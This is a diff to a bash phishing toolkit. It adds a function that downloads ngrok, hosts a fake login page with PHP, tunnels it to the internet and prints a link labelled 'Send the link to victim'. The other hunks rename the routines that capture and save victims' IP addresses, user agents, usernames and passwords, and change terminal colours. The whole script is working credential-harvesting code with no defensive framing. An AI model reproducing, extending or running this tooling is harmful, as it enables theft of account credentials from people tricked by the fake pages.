@@ -12,11 +12,11 @@ trap 'printf "\n";stop;exit 1' 2
 
 dependencies() {
 
-command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "Wget is not installed ! Install it"; exit 1; }
-command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
-command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m PHP is not installed ! Install it."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m Curl is not installed ! Install it."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m Wget is not installed ! Install it"; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m Openssh is not installed ! Install it"; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m Unzip is not installed ! Install it"; exit 1; }
 
 }    
 banner() {
@@ -248,7 +248,7 @@ start_serveo
 
 start_serveo() {
 printf "\e[0m\n"
-printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Initializing...\e[0m\e[1;93m(localhost:$port)\n"
+printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
 cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[0m\n"
@@ -266,6 +266,54 @@ printf "\n"
 found
 
 }
+start_n() {
+if [[ -e websites/$server/ip.txt ]]; then
+rm -rf websites/$server/ip.txt
+fi
+if [[ -e websites/$server/usernames.txt ]]; then
+rm -rf websites/$server/usernames.txt
+fi
+printf "\e[0m\n"
+printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;96m[\e[1;97m!\e[1;96m]\e[1;93m Error \e[1;96m[\e[1;97m!\e[1;96m]\e[1;96m Please Install All Packges.\e[0m\n"
+exit 1
+fi
+
+
+else
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;96m[\e[1;97m!\e[1;96m]\e[1;93m Error \e[1;96m[\e[1;97m!\e[1;96m]\e[1;96m Please Install All Packges.\e[0m\n"
+exit 1
+fi
+fi
+fi
+
+printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
+cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+sleep 2
+./ngrok http 5555 > /dev/null 2>&1 &
+sleep 7
+
+ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ngrok_link
+found
+}
+
 found() {
 
 printf "\n"
@@ -275,13 +323,13 @@ while [ true ]; do
 
 if [[ -e "websites/$server/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] Victim IP Found!\n"
-catch_ip
+c_ip
 rm -rf websites/$server/ip.txt
 fi
 sleep 0.75
 if [[ -e "websites/$server/usernames.txt" ]]; then
 printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Login info Found!\n"
-catch_cred
+c_cred
 rm -rf websites/$server/usernames.txt
 fi
 sleep 0.75
@@ -290,19 +338,19 @@ sleep 0.75
 done 
 
 }
-catch_ip() {
+c_ip() {
 touch websites/$server/login_info.txt
 ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
-printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;92m %s\e[0m\n" $ip
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
 printf "\e[0m\n"
 printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/victim_ip.txt\e[0m\n" $server
 cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
 
 }
 
-catch_cred() {
+c_cred() {
 
 account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
@@ -316,7 +364,6 @@ printf "\n"
 printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
 
 }
-
 
 banner
 dependencies
